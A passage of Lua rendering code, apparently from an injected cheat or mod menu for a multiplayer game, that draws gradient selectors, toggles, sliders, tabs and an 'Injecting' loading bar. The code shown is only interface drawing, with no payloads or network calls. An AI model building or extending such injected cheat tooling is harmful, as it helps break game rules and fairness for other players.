local baseB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and (Menu.Colors.SelectedBg.b / 255.0) or (255 / 255.0)  -- Blue: 255
local darkenAmount = 0.4

local selectorX = x

        if Menu.GradientType == 2 then
            local gradientSteps = 60
            local drawWidth = width - 1
            local stepWidth = drawWidth / gradientSteps
            local selectorY = drawY
            local selectorHeight = itemHeight

            for step = 0, gradientSteps - 1 do
                local stepX = x + (step * stepWidth)
                local actualStepWidth = stepWidth

                if actualStepWidth > 0 then
                    local stepGradientFactor = step / (gradientSteps - 1)
                    local darkenFactor = stepGradientFactor * stepGradientFactor * stepGradientFactor
                    local stepDarken = darkenFactor * 0.8

                    local stepR = math.max(0, baseR - stepDarken)
                    local stepG = math.max(0, baseG - stepDarken)
                    local stepB = math.max(0, baseB - stepDarken)

                    local alpha = 0.9
                    if step > gradientSteps - 15 then
                        alpha = 0.9 * (1.0 - ((step - (gradientSteps - 15)) / 15))
                    end

                    if Susano and Susano.DrawRectFilled then
                        Susano.DrawRectFilled(stepX, selectorY, actualStepWidth, selectorHeight, stepR, stepG, stepB, alpha, 0.0)
                    else
                        Menu.DrawRect(stepX, selectorY, actualStepWidth, selectorHeight, stepR * 255, stepG * 255, stepB * 255, math.floor(alpha * 255))
                    end
                end
            end
        else
            local gradientSteps = 20
            local stepHeight = itemHeight / gradientSteps
            local selectorWidth = width - 1

            for step = 0, gradientSteps - 1 do
                local stepY = drawY + (step * stepHeight)
                local actualStepHeight = math.min(stepHeight, (drawY + itemHeight) - stepY)
                if actualStepHeight > 0 then
                    local stepGradientFactor = step / (gradientSteps - 1)
                    local stepDarken = stepGradientFactor * darkenAmount

                    local stepR = math.max(0, baseR - stepDarken)
                    local stepG = math.max(0, baseG - stepDarken)
                    local stepB = math.max(0, baseB - stepDarken)

                    if Susano and Susano.DrawRectFilled then
                        Susano.DrawRectFilled(selectorX, stepY, selectorWidth, actualStepHeight, stepR, stepG, stepB, 0.9, 0.0)
                    else
                        Menu.DrawRect(selectorX, stepY, selectorWidth, actualStepHeight, stepR * 255, stepG * 255, stepB * 255, 220)
                    end
                end
            end
        end

        Menu.DrawRect(selectorX, drawY, 3, itemHeight, Menu.Colors.SelectedBg.r, Menu.Colors.SelectedBg.g, Menu.Colors.SelectedBg.b, 255)
    end

    local textX = x + 18
    local textY = itemY + itemHeight / 2 - 9
    local currentAlpha = isSelected and (Menu.FadeAlpha or 1.0) or 1.0
    Menu.DrawText(textX, textY, item.name, 18, Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, currentAlpha)

    -- Draw warning icon next to risky/exposed items
    if Menu.IsItemRisky(item.name) and Menu.warningTexture and Menu.warningTexture > 0 and Susano and Susano.DrawImage then
        local iconHeight = 16
        local iconWidth = 16
        if Menu.warningWidth and Menu.warningWidth > 0 and Menu.warningHeight and Menu.warningHeight > 0 then
            iconWidth = iconHeight * (Menu.warningWidth / Menu.warningHeight)
        end
        local nameWidth = 0
        if Susano.GetTextWidth then
            nameWidth = Susano.GetTextWidth(item.name, 18)
        else
            nameWidth = #item.name * 9
        end
        local iconX = textX + nameWidth + 5
        local iconY = itemY + (itemHeight / 2) - (iconHeight / 2)
        Susano.DrawImage(Menu.warningTexture, iconX, iconY, iconWidth, iconHeight, 1, 0.2, 0.2, 0.9, 0)
    end

    if not item.isSeparator then
        local tabLower = (currentTabName or ""):lower()
        local iconKey = nil
        
        if tabLower:match("weapon") then iconKey = "weapon"
        elseif tabLower:match("vehicle") or tabLower:match("spawn") then iconKey = "vehicle" end
        
        if item.name then
            local nLower = item.name:lower()
            if nLower:match("weapon") or nLower:match("gun") or nLower:match("pistol") or nLower:match("rifle") or nLower:match("shotgun") then iconKey = "weapon" end
            if nLower:match("vehicle") or nLower:match("car") or nLower:match("spawn") or nLower:match("zentorno") then iconKey = "vehicle" end
        end
        
        if not iconKey and Menu.OpenedCategory then
            local cat = Menu.Categories[Menu.OpenedCategory]
            if cat and cat.name then
                local cLower = cat.name:lower()
                if cLower:match("weapon") then iconKey = "weapon"
                elseif cLower:match("vehicle") then iconKey = "vehicle" end
            end
        end

        local tex, tw, th = nil, 0, 0
        if iconKey == "weapon" and Menu.weaponTexture and Menu.weaponTexture > 0 then
            tex = Menu.weaponTexture
            tw = Menu.weaponWidth
            th = Menu.weaponHeight
        elseif iconKey == "vehicle" and Menu.vehicleTexture and Menu.vehicleTexture > 0 then
            tex = Menu.vehicleTexture
            tw = Menu.vehicleWidth
            th = Menu.vehicleHeight
        end

        if tex and Susano and Susano.DrawImage then
            local iconH = 18
            local iconW = 18
            if th and th > 0 and tw then
                iconW = iconH * (tw / th)
            end
            local iconY = itemY + (itemHeight / 2) - (iconH / 2)
            local iconX = x + width - iconW - 15
            if item.type == "toggle" then iconX = iconX - 45
            elseif item.type == "selector" then iconX = iconX - 60
            elseif item.rightText then iconX = iconX - 40 end
            Susano.DrawImage(tex, iconX, iconY, iconW, iconH, 1, 1, 1, 0.85, 0)
        end
    end

    if item.type == "toggle" then
        local toggleWidth = 36
        local toggleHeight = 16
        local toggleX = x + width - toggleWidth - 18
        local toggleY = itemY + (itemHeight / 2) - (toggleHeight / 2)
        local toggleRadius = toggleHeight / 2

        if item.value then
            local tR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and (Menu.Colors.SelectedBg.r / 255.0) or 1.0
            local tG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and (Menu.Colors.SelectedBg.g / 255.0) or 0.0
            local tB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and (Menu.Colors.SelectedBg.b / 255.0) or 1.0

            if Susano and Susano.DrawRectFilled then
                Susano.DrawRectFilled(toggleX, toggleY, toggleWidth, toggleHeight,
                    tR, tG, tB, 0.95,
                    toggleRadius)
            else
                Menu.DrawRoundedRect(toggleX, toggleY, toggleWidth, toggleHeight,
                    tR * 255, tG * 255, tB * 255, 242,
                    toggleRadius)
            end
        else
            if Susano and Susano.DrawRectFilled then
                Susano.DrawRectFilled(toggleX, toggleY, toggleWidth, toggleHeight,
                    0.2, 0.2, 0.2, 0.95,
                    toggleRadius)
            else
                Menu.DrawRoundedRect(toggleX, toggleY, toggleWidth, toggleHeight,
                    51, 51, 51, 242,
                    toggleRadius)
            end
        end

        local circleSize = toggleHeight - 4
        local circleY = toggleY + 2
        local circleX
        if item.value then
            circleX = toggleX + toggleWidth - circleSize - 2
        else
            circleX = toggleX + 2
        end

        if Susano and Susano.DrawRectFilled then
            Susano.DrawRectFilled(circleX, circleY, circleSize, circleSize,
                0.0, 0.0, 0.0, 1.0,
                circleSize / 2)
        else
            Menu.DrawRoundedRect(circleX, circleY, circleSize, circleSize,
                0, 0, 0, 255,
                circleSize / 2)
        end

        if item.hasSlider then
            local sliderWidth = 85
            local sliderHeight = 6
            local sliderX = x + width - sliderWidth - 95
            local sliderY = itemY + (itemHeight / 2) - (sliderHeight / 2)

            local currentValue = item.sliderValue or item.sliderMin or 0.0
            local minValue = item.sliderMin or 0.0
            local maxValue = item.sliderMax or 100.0

            local percent = (currentValue - minValue) / (maxValue - minValue)
            percent = math.max(0.0, math.min(1.0, percent))

            if Susano and Susano.DrawRectFilled then
                Susano.DrawRectFilled(sliderX, sliderY, sliderWidth, sliderHeight,
                    0.12, 0.12, 0.12, 0.7, 3.0)
            else
                Menu.DrawRoundedRect(sliderX, sliderY, sliderWidth, sliderHeight,
                    31, 31, 31, 180, 3.0)
            end

            if percent > 0 then
                if Susano and Susano.DrawRectFilled then
                    local accentR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and (Menu.Colors.SelectedBg.r / 255.0 * 1.3) or 1.0
                    local accentG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and (Menu.Colors.SelectedBg.g / 255.0 * 1.3) or 0.0
                    local accentB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and (Menu.Colors.SelectedBg.b / 255.0 * 1.3) or 1.0
                    accentR = math.min(1.0, accentR)
                    accentG = math.min(1.0, accentG)
                    accentB = math.min(1.0, accentB)
                    Susano.DrawRectFilled(sliderX, sliderY, sliderWidth * percent, sliderHeight,
                        accentR, accentG, accentB, 1.0, 3.0)
                else
                    local accentR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and math.min(255, Menu.Colors.SelectedBg.r * 1.3) or 255
                    local accentG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and math.min(255, Menu.Colors.SelectedBg.g * 1.3) or 0
                    local accentB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and math.min(255, Menu.Colors.SelectedBg.b * 1.3) or 255
                    Menu.DrawRoundedRect(sliderX, sliderY, sliderWidth * percent, sliderHeight,
                        accentR, accentG, accentB, 255, 3.0)
                end
            end

            local thumbSize = 10
            local thumbX = sliderX + (sliderWidth * percent) - (thumbSize / 2)
            local thumbY = itemY + (itemHeight / 2) - (thumbSize / 2)

            if Susano and Susano.DrawRectFilled then
                Susano.DrawRectFilled(thumbX, thumbY, thumbSize, thumbSize,
                    1.0, 1.0, 1.0, 1.0, 5.0)
            else
                Menu.DrawRoundedRect(thumbX, thumbY, thumbSize, thumbSize,
                    255, 255, 255, 255, 5.0)
            end

            local valueText
            if item.name == "Freecam" then
                valueText = string.format("%.1f", currentValue)
            else
                valueText = string.format("%.1f", currentValue)
            end
            local valuePadding = 10
            local valueX = sliderX + sliderWidth + valuePadding
            local valueY = sliderY + (sliderHeight / 2) - 6
            Menu.DrawText(valueX, valueY, valueText, 10, Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, 0.8)
        end
    elseif item.type == "toggle_selector" then
        local toggleWidth = 36
        local toggleHeight = 16
        local toggleX = x + width - toggleWidth - 18
        local toggleY = itemY + (itemHeight / 2) - (toggleHeight / 2)
        local toggleRadius = toggleHeight / 2

        if item.value then
            local tR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and (Menu.Colors.SelectedBg.r / 255.0) or 1.0
            local tG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and (Menu.Colors.SelectedBg.g / 255.0) or 0.0
            local tB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and (Menu.Colors.SelectedBg.b / 255.0) or 1.0

            if Susano and Susano.DrawRectFilled then
                Susano.DrawRectFilled(toggleX, toggleY, toggleWidth, toggleHeight, tR, tG, tB, 0.95, toggleRadius)
            else
                Menu.DrawRoundedRect(toggleX, toggleY, toggleWidth, toggleHeight, tR * 255, tG * 255, tB * 255, 242, toggleRadius)
            end
        else
            if Susano and Susano.DrawRectFilled then
                Susano.DrawRectFilled(toggleX, toggleY, toggleWidth, toggleHeight, 0.2, 0.2, 0.2, 0.95, toggleRadius)
            else
                Menu.DrawRoundedRect(toggleX, toggleY, toggleWidth, toggleHeight, 51, 51, 51, 242, toggleRadius)
            end
        end

        local circleSize = toggleHeight - 4
        local circleY = toggleY + 2
        local circleX
        if item.value then
            circleX = toggleX + toggleWidth - circleSize - 2
        else
            circleX = toggleX + 2
        end

        if Susano and Susano.DrawRectFilled then
            Susano.DrawRectFilled(circleX, circleY, circleSize, circleSize, 0.0, 0.0, 0.0, 1.0, circleSize / 2)
        else
            Menu.DrawRoundedRect(circleX, circleY, circleSize, circleSize, 0, 0, 0, 255, circleSize / 2)
        end

        if item.options then
            local selectedIndex = item.selected or 1
            local selectedOption = item.options[selectedIndex] or ""
            local selectorSize = 16
            local textY = itemY + itemHeight / 2 - 7

            local fullText = "< " .. selectedOption .. " >"
            local selectorWidth = 0
            if Susano and Susano.GetTextWidth then
                selectorWidth = Susano.GetTextWidth(fullText, selectorSize)
            else
                selectorWidth = string.len(fullText) * 9
            end

            local selectorX = toggleX - selectorWidth - 15

            Menu.DrawText(selectorX, textY, "<", selectorSize,
                Menu.Colors.TextWhite.r / 255.0 * 0.8, Menu.Colors.TextWhite.g / 255.0 * 0.8, Menu.Colors.TextWhite.b / 255.0 * 0.8, 0.8)

            local leftArrowWidth = 0
            if Susano and Susano.GetTextWidth then
                leftArrowWidth = Susano.GetTextWidth("< ", selectorSize)
            else
                leftArrowWidth = 18
            end
            Menu.DrawText(selectorX + leftArrowWidth, textY, selectedOption, selectorSize, 1.0, 1.0, 1.0, 1.0)

            local optionWidth = 0
            if Susano and Susano.GetTextWidth then
                optionWidth = Susano.GetTextWidth(selectedOption, selectorSize)
            else
                optionWidth = string.len(selectedOption) * 9
            end
            Menu.DrawText(selectorX + leftArrowWidth + optionWidth + 5, textY, ">", selectorSize,
                Menu.Colors.TextWhite.r / 255.0 * 0.8, Menu.Colors.TextWhite.g / 255.0 * 0.8, Menu.Colors.TextWhite.b / 255.0 * 0.8, 0.8)
        end
    elseif item.type == "slider" then
        local sliderWidth = 85
        local sliderHeight = 6
        local sliderX = x + width - sliderWidth - 60
        local sliderY = itemY + (itemHeight / 2) - (sliderHeight / 2)

        local currentValue = item.value or item.min or 0.0
        local minValue = item.min or 0.0
        local maxValue = item.max or 100.0

        local percent = (currentValue - minValue) / (maxValue - minValue)
        percent = math.max(0.0, math.min(1.0, percent))

        if Susano and Susano.DrawRectFilled then
            Susano.DrawRectFilled(sliderX, sliderY, sliderWidth, sliderHeight,
                0.12, 0.12, 0.12, 0.7, 3.0)
        else
            Menu.DrawRoundedRect(sliderX, sliderY, sliderWidth, sliderHeight,
                31, 31, 31, 180, 3.0)
        end

        if percent > 0 then
            if Susano and Susano.DrawRectFilled then
                local accentR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and (Menu.Colors.SelectedBg.r / 255.0 * 1.3) or 1.0
                local accentG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and (Menu.Colors.SelectedBg.g / 255.0 * 1.3) or 0.0
                local accentB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and (Menu.Colors.SelectedBg.b / 255.0 * 1.3) or 1.0
                accentR = math.min(1.0, accentR)
                accentG = math.min(1.0, accentG)
                accentB = math.min(1.0, accentB)
                Susano.DrawRectFilled(sliderX, sliderY, sliderWidth * percent, sliderHeight,
                    accentR, accentG, accentB, 1.0, 3.0)
            else
                local accentR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and math.min(255, Menu.Colors.SelectedBg.r * 1.3) or 255
                local accentG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and math.min(255, Menu.Colors.SelectedBg.g * 1.3) or 0
                local accentB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and math.min(255, Menu.Colors.SelectedBg.b * 1.3) or 255
                Menu.DrawRoundedRect(sliderX, sliderY, sliderWidth * percent, sliderHeight,
                    accentR, accentG, accentB, 255, 3.0)
            end
        end

        local thumbSize = 10
        local thumbX = sliderX + (sliderWidth * percent) - (thumbSize / 2)
        local thumbY = itemY + (itemHeight / 2) - (thumbSize / 2)

        if Susano and Susano.DrawRectFilled then
                Susano.DrawRectFilled(thumbX, thumbY, thumbSize, thumbSize,
                    1.0, 1.0, 1.0, 1.0, 5.0)
            else
                Menu.DrawRoundedRect(thumbX, thumbY, thumbSize, thumbSize,
                    255, 255, 255, 255, 5.0)
            end

        local valueText = string.format("%.0f", currentValue)
        local valuePadding = 10
        local valueX = sliderX + sliderWidth + valuePadding
        local valueY = sliderY + (sliderHeight / 2) - 6
        Menu.DrawText(valueX, valueY, valueText, 10, Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, 0.8)
    elseif item.type == "selector" and item.options then
        local selectedIndex = item.selected or 1
        local selectedOption = item.options[selectedIndex] or ""
        local selectorSize = 16

        local isWardrobeSelector = false
        local wardrobeItemNames = {"Hat", "Mask", "Glasses", "Torso", "Tshirt", "Pants", "Shoes"}
        for _, name in ipairs(wardrobeItemNames) do
            if item.name == name then
                isWardrobeSelector = true
                break
            end
        end

        if isWardrobeSelector then
            local displayValue = selectedIndex
            local selectorText = "- " .. tostring(displayValue) .. " -"
            local selectorWidth = 0
            if Susano and Susano.GetTextWidth then
                selectorWidth = Susano.GetTextWidth(selectorText, selectorSize)
            else
                selectorWidth = string.len(selectorText) * 9
            end
            local selectorX = x + width - selectorWidth - 15
            Menu.DrawText(selectorX, textY, selectorText, selectorSize,
                1.0, 1.0, 1.0, 1.0)
        else
            local fullText = "< " .. selectedOption .. " >"
            local selectorWidth = 0
            if Susano and Susano.GetTextWidth then
                selectorWidth = Susano.GetTextWidth(fullText, selectorSize)
            else
                selectorWidth = string.len(fullText) * 9
            end

            local selectorX = x + width - selectorWidth - 15

            Menu.DrawText(selectorX, textY, "<", selectorSize,
                Menu.Colors.TextWhite.r / 255.0 * 0.8, Menu.Colors.TextWhite.g / 255.0 * 0.8, Menu.Colors.TextWhite.b / 255.0 * 0.8, 0.8)

            local leftArrowWidth = 0
            if Susano and Susano.GetTextWidth then
                leftArrowWidth = Susano.GetTextWidth("< ", selectorSize)
            else
                leftArrowWidth = 18
            end
            Menu.DrawText(selectorX + leftArrowWidth, textY, selectedOption, selectorSize,
                1.0, 1.0, 1.0, 1.0)

            local optionWidth = 0
            if Susano and Susano.GetTextWidth then
                optionWidth = Susano.GetTextWidth(selectedOption, selectorSize)
            else
                optionWidth = string.len(selectedOption) * 9
            end
            Menu.DrawText(selectorX + leftArrowWidth + optionWidth + 5, textY, ">", selectorSize,
                Menu.Colors.TextWhite.r / 255.0 * 0.8, Menu.Colors.TextWhite.g / 255.0 * 0.8, Menu.Colors.TextWhite.b / 255.0 * 0.8, 0.8)
        end
    end
end

function Menu.DrawCategories()
    if Menu.OpenedCategory then
        local category = Menu.Categories[Menu.OpenedCategory]
        if not category or not category.hasTabs or not category.tabs then
            Menu.OpenedCategory = nil
            return
        end

        local scaledPos = Menu.GetScaledPosition()
        local x = scaledPos.x
        local startY = scaledPos.y + scaledPos.headerHeight
        local width = scaledPos.width
        local itemHeight = scaledPos.itemHeight
        local mainMenuHeight = scaledPos.mainMenuHeight
        local mainMenuSpacing = scaledPos.mainMenuSpacing

        Menu.DrawTabs(category, x, startY, width, mainMenuHeight)

        local currentTab = category.tabs[Menu.CurrentTab]
        if currentTab and currentTab.items then
            local itemY = startY + mainMenuHeight + mainMenuSpacing
            local totalItems = #currentTab.items
            local maxVisible = Menu.ItemsPerPage

            local nonSeparatorCount = 0
            for _, item in ipairs(currentTab.items) do
                if not item.isSeparator then
                    nonSeparatorCount = nonSeparatorCount + 1
                end
            end

            if Menu.CurrentItem > Menu.ItemScrollOffset + maxVisible then
                Menu.ItemScrollOffset = Menu.CurrentItem - maxVisible
            elseif Menu.CurrentItem <= Menu.ItemScrollOffset then
                Menu.ItemScrollOffset = math.max(0, Menu.CurrentItem - 1)
            end

            local visibleHeight = math.min(maxVisible, totalItems) * itemHeight
            for i = 1, math.min(maxVisible, totalItems) do
                local itemIndex = i + Menu.ItemScrollOffset
                if itemIndex <= totalItems then
                    local item = currentTab.items[itemIndex]
                    local itemYPos = itemY + (i - 1) * itemHeight
                    local isSelected = (itemIndex == Menu.CurrentItem)
                    Menu.DrawItem(x, itemYPos, width, itemHeight, item, isSelected, currentTab.name)
                end
            end

            if nonSeparatorCount > 0 then
                Menu.DrawScrollbar(x, itemY, visibleHeight, Menu.CurrentItem, nonSeparatorCount, false, width)
            end
        end
        return
    end

    local scaledPos = Menu.GetScaledPosition()
    local x = scaledPos.x
    local startY = scaledPos.y + scaledPos.headerHeight
    local width = scaledPos.width
    local itemHeight = scaledPos.itemHeight
    local mainMenuHeight = scaledPos.mainMenuHeight
    local mainMenuSpacing = scaledPos.mainMenuSpacing

    local totalCategories = #Menu.Categories - 1
    local maxVisible = Menu.ItemsPerPage

    if Menu.CurrentCategory > Menu.CategoryScrollOffset + maxVisible + 1 then
        Menu.CategoryScrollOffset = Menu.CurrentCategory - maxVisible - 1
    elseif Menu.CurrentCategory <= Menu.CategoryScrollOffset + 1 then
        Menu.CategoryScrollOffset = math.max(0, Menu.CurrentCategory - 2)
    end

    local itemY = startY
    Menu.DrawBottomRoundedRect(x, itemY, width, mainMenuHeight, Menu.Colors.FooterBlack.r, Menu.Colors.FooterBlack.g, Menu.Colors.FooterBlack.b, 255, 6 * (Menu.Scale or 1.0))

    if Menu.TopLevelTabs then
        local tabCount = #Menu.TopLevelTabs
        local tabWidth = width / tabCount

        for i, tab in ipairs(Menu.TopLevelTabs) do
            local tabX = x + (i - 1) * tabWidth
            local isSelected = (i == Menu.CurrentTopTab)

            if isSelected then
                if not Menu.TopTabSelectorX then
                    Menu.TopTabSelectorX = tabX
                    Menu.TopTabSelectorWidth = tabWidth
                end

                local smoothSpeed = Menu.SmoothFactor
                Menu.TopTabSelectorX = Menu.TopTabSelectorX + (tabX - Menu.TopTabSelectorX) * smoothSpeed
                Menu.TopTabSelectorWidth = Menu.TopTabSelectorWidth + (tabWidth - Menu.TopTabSelectorWidth) * smoothSpeed

                if math.abs(Menu.TopTabSelectorX - tabX) < 0.5 then Menu.TopTabSelectorX = tabX end
                if math.abs(Menu.TopTabSelectorWidth - tabWidth) < 0.5 then Menu.TopTabSelectorWidth = tabWidth end

                local drawX = Menu.TopTabSelectorX
                local drawWidth = Menu.TopTabSelectorWidth

                local baseR = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.r) and (Menu.Colors.SelectedBg.r / 255.0) or 1.0
                local baseG = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.g) and (Menu.Colors.SelectedBg.g / 255.0) or 0.0
                local baseB = (Menu.Colors.SelectedBg and Menu.Colors.SelectedBg.b) and (Menu.Colors.SelectedBg.b / 255.0) or 1.0

                local gradientSteps = 20
                local stepHeight = mainMenuHeight / gradientSteps
                local gradStartY = itemY

                for step = 0, gradientSteps - 1 do
                    local stepY = gradStartY + (step * stepHeight)
                    local actualStepHeight = stepHeight
                    local maxY = gradStartY + mainMenuHeight
                    if stepY + actualStepHeight > maxY then
                         actualStepHeight = maxY - stepY
                    end

                    local alpha = (step / gradientSteps) * 0.5

                    if Susano and Susano.DrawRectFilled then
                        Susano.DrawRectFilled(drawX, stepY, drawWidth, actualStepHeight, baseR, baseG, baseB, alpha, 0)
                    else
                         Menu.DrawRect(drawX, stepY, drawWidth, actualStepHeight, math.floor(baseR*255), math.floor(baseG*255), math.floor(baseB*255), math.floor(alpha*255))
                    end
                end

                if Susano and Susano.DrawRectFilled then
                    Susano.DrawRectFilled(drawX, itemY + mainMenuHeight - 2, drawWidth, 2, baseR, baseG, baseB, 1.0, 0)
                else
                    Menu.DrawRect(drawX, itemY + mainMenuHeight - 2, drawWidth, 2, math.floor(baseR*255), math.floor(baseG*255), math.floor(baseB*255), 255)
                end
            end

            local text = tab.name
            local textSize = 16
            local textWidth = 0
            if Susano and Susano.GetTextWidth then
                textWidth = Susano.GetTextWidth(text, textSize)
            else
                textWidth = string.len(text) * 9
            end

            local textX = tabX + (tabWidth / 2) - (textWidth / 2)
            local textY = itemY + mainMenuHeight / 2 - 7

            local r, g, b = Menu.Colors.TextWhite.r, Menu.Colors.TextWhite.g, Menu.Colors.TextWhite.b
            if not isSelected then
                r, g, b = 150, 150, 150
            end

            Menu.DrawText(textX, textY, text, textSize, r/255.0, g/255.0, b/255.0, 1.0)
        end
    else
        local textY = itemY + mainMenuHeight / 2 - 7
        local estimatedTextWidth = string.len(Menu.Categories[1].name) * 9
        local textX = x + (width / 2) - (estimatedTextWidth / 2)
        Menu.DrawText(textX, textY, Menu.Categories[1].name, 16, Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, 1.0)
    end

    local visibleHeight = math.min(maxVisible, totalCategories) * itemHeight
    for displayIndex = 1, math.min(maxVisible, totalCategories) do
        local categoryIndex = displayIndex + Menu.CategoryScrollOffset + 1
        if categoryIndex <= #Menu.Categories then
            local category = Menu.Categories[categoryIndex]
            local isSelected = (categoryIndex == Menu.CurrentCategory)

            local itemY = startY + mainMenuHeight + mainMenuSpacing + (displayIndex - 1) * itemHeight
            Menu.DrawRect(x, itemY, width, itemHeight, Menu.Colors.BackgroundDark.r, Menu.Colors.BackgroundDark.g, Menu.Colors.BackgroundDark.b, 50)

            if isSelected then
                if Menu.CategorySelectorY == 0 then
                    Menu.CategorySelectorY = itemY
                end

                local smoothSpeed = Menu.SmoothFactor
                Menu.CategorySelectorY = Menu.CategorySelectorY + (itemY - Menu.CategorySelectorY) * smoothSpeed
                if math.abs(Menu.CategorySelectorY - itemY) < 0.5 then
                    Menu.CategorySelectorY = itemY
                end

                local drawY = Menu.CategorySelectorY

                local baseR = Menu.Colors.SelectedBg.r / 255.0
                local baseG = Menu.Colors.SelectedBg.g / 255.0
                local baseB = Menu.Colors.SelectedBg.b / 255.0
                local darkenAmount = 0.4

                local selectorX = x

                if Menu.GradientType == 2 then
                    local gradientSteps = 60
                    local drawWidth = width - 1
                    local stepWidth = drawWidth / gradientSteps
                    local selectorY = drawY
                    local selectorHeight = itemHeight

                    for step = 0, gradientSteps - 1 do
                        local stepX = x + (step * stepWidth)
                        local actualStepWidth = stepWidth

                        if actualStepWidth > 0 then
                            local stepGradientFactor = step / (gradientSteps - 1)
                            local darkenFactor = stepGradientFactor * stepGradientFactor * stepGradientFactor
                            local stepDarken = darkenFactor * 0.8

                            local stepR = math.max(0, baseR - stepDarken)
                            local stepG = math.max(0, baseG - stepDarken)
                            local stepB = math.max(0, baseB - stepDarken)

                            local alpha = 0.9
                            if step > gradientSteps - 15 then
                                alpha = 0.9 * (1.0 - ((step - (gradientSteps - 15)) / 15))
                            end

                            if Susano and Susano.DrawRectFilled then
                                Susano.DrawRectFilled(stepX, selectorY, actualStepWidth, selectorHeight, stepR, stepG, stepB, alpha, 0.0)
                            else
                                Menu.DrawRect(stepX, selectorY, actualStepWidth, selectorHeight, stepR * 255, stepG * 255, stepB * 255, math.floor(alpha * 255))
                            end
                        end
                    end
                else
                    local gradientSteps = 20
                    local stepHeight = itemHeight / gradientSteps
                    local selectorWidth = width - 1

                    for step = 0, gradientSteps - 1 do
                        local stepY = drawY + (step * stepHeight)
                        local actualStepHeight = math.min(stepHeight, (drawY + itemHeight) - stepY)
                        if actualStepHeight > 0 then
                            local stepGradientFactor = step / (gradientSteps - 1)
                            local stepDarken = stepGradientFactor * darkenAmount

                            local stepR = math.max(0, baseR - stepDarken)
                            local stepG = math.max(0, baseG - stepDarken)
                            local stepB = math.max(0, baseB - stepDarken)

                            if Susano and Susano.DrawRectFilled then
                                Susano.DrawRectFilled(selectorX, stepY, selectorWidth, actualStepHeight, stepR, stepG, stepB, 0.9, 0.0)
                            else
                                Menu.DrawRect(selectorX, stepY, selectorWidth, actualStepHeight, stepR * 255, stepG * 255, stepB * 255, 220)
                            end
                        end
                    end
                end

                Menu.DrawRect(selectorX, drawY, 3, itemHeight, Menu.Colors.SelectedBg.r, Menu.Colors.SelectedBg.g, Menu.Colors.SelectedBg.b, 255)
            end

            local textX = x + 18
            local textY = itemY + itemHeight / 2 - 9
            Menu.DrawText(textX, textY, category.name, 18, Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, 1.0)

            local chevronX = x + width - 22
            Menu.DrawText(chevronX, textY, ">", 18, Menu.Colors.TextWhite.r / 255.0, Menu.Colors.TextWhite.g / 255.0, Menu.Colors.TextWhite.b / 255.0, 1.0)
        end
    end

    if totalCategories >= maxVisible then
        local scrollbarStartY = startY + mainMenuHeight + mainMenuSpacing
        Menu.DrawScrollbar(x, scrollbarStartY, visibleHeight, Menu.CurrentCategory, totalCategories, true, width)
    end
end

function Menu.DrawTopRoundedRect(x, y, width, height, r, g, b, a, radius)
    Menu.DrawRect(x, y + radius, width, height - radius, r, g, b, a)
    Menu.DrawRect(x + radius, y, width - 2 * radius, radius, r, g, b, a)

    for i = 0, radius - 1 do
        local slice_width = math.ceil(math.sqrt(radius * radius - i * i))
        local y_pos = y + radius - 1 - i

        Menu.DrawRect(x + radius - slice_width, y_pos, slice_width, 1, r, g, b, a)

        Menu.DrawRect(x + width - radius, y_pos, slice_width, 1, r, g, b, a)
    end
end

function Menu.DrawBottomRoundedRect(x, y, width, height, r, g, b, a, radius)
    radius = math.max(0, math.min(radius or 0, width / 2, height / 2))
    if radius == 0 then
        Menu.DrawRect(x, y, width, height, r, g, b, a)
        return
    end

    Menu.DrawRect(x, y, width, height - radius, r, g, b, a)
    Menu.DrawRect(x + radius, y + height - radius, width - (radius * 2), radius, r, g, b, a)

    for i = 0, radius - 1 do
        local sliceWidth = math.ceil(math.sqrt(radius * radius - i * i))
        local rowY = y + height - radius + i
        Menu.DrawRect(x + radius - sliceWidth, rowY, sliceWidth, 1, r, g, b, a)
        Menu.DrawRect(x + width - radius, rowY, sliceWidth, 1, r, g, b, a)
    end
end

function Menu.DrawLoadingBar(alpha)
    if alpha <= 0 then return end

    local screenWidth = 1920
    local screenHeight = 1080
    if Susano and Susano.GetScreenWidth and Susano.GetScreenHeight then
        screenWidth = Susano.GetScreenWidth()
        screenHeight = Susano.GetScreenHeight()
    end

    local centerX = screenWidth / 2
    local centerY = screenHeight - 150
    local radius = 40
    local thickness = 8

    local currentTime = GetGameTimer() or 0
    local elapsedTime = 0
    if Menu.LoadingStartTime then
        elapsedTime = currentTime - Menu.LoadingStartTime
    end

    local loadingText = ""
    if elapsedTime < 1000 then
        loadingText = "Injecting"
    elseif elapsedTime < 2000 then
        loadingText = "Have Fun !"
    else
        loadingText = "Have Fun !"
    end

    if loadingText ~= "" then
        local textSize = 18
